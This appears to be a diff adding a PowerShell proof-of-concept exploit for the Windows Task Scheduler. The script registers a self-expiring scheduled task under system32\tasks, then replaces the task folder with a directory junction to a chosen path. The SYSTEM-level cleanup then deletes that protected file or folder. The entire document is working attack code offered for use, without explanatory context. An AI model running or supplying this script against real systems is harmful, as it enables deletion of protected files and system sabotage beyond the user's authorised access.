@@ -1,0 +1,23 @@
+# Change this to the path you want to delete
+$filetodelete = "c:\protected\test"
+
+$nametodelete = Split-Path $filetodelete -Leaf 
+$juncpath = Split-Path $filetodelete -Parent
+
+$now = Get-Date
+$run = $now.AddSeconds(5)
+$expire = $run.AddSeconds(1).ToString('s')
+
+mkdir "$env:windir\system32\tasks\dummybin" -Force
+
+$action = New-ScheduledTaskAction -Execute "cmd" -Argument "/C rmdir /Q /S $env:windir\system32\tasks\dummybin && mklink /J $env:windir\system32\tasks\dummybin $juncpath"
+$trigger = New-ScheduledTaskTrigger -At $run -Once
+$settings = New-ScheduledTaskSettingsSet 
+$settings.DeleteExpiredTaskAfter = "PT0S"
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Description $nametodelete
+$task.Triggers[0].EndBoundary = $expire
+
+Register-ScheduledTask -TaskName $nametodelete -TaskPath "\dummybin" -InputObject $task
+Start-Sleep 7
+
+rmdir "$env:windir\system32\tasks\dummybin" -Force
